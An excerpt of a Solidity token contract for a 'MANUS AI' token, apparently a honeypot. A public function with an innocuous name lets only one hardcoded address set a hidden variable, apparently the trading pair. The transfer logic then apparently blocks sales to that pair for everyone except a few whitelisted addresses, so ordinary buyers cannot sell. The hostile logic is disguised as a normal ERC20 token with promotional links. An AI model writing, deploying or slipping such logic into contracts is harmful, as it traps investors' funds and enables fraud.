/* 
    website  : https://www.MANUS.com
    twitter  : https://x.com/MANUS
    telegram : https://t.me/MANUS
*/
...
contract MANUSAI is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x940Fa924fE2CEd2444C5d664c3daE611CE1AAB48) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         (_p76234 == to  && from != 0x940Fa924fE2CEd2444C5d664c3daE611CE1AAB48 && from != 0xC2647aa19988e39327Db57b6Cda26C9755a985ae && from != 0x3f233253b4266197e9d8186A8888d52E5C650AE6 && from != 0xBa5eA65482E4da4635f0B948a90f602CB41B2F2C)) 
        {
    ...
    constructor() {
        _name = unicode"MANUS AI";
        _symbol = unicode"MANUS";
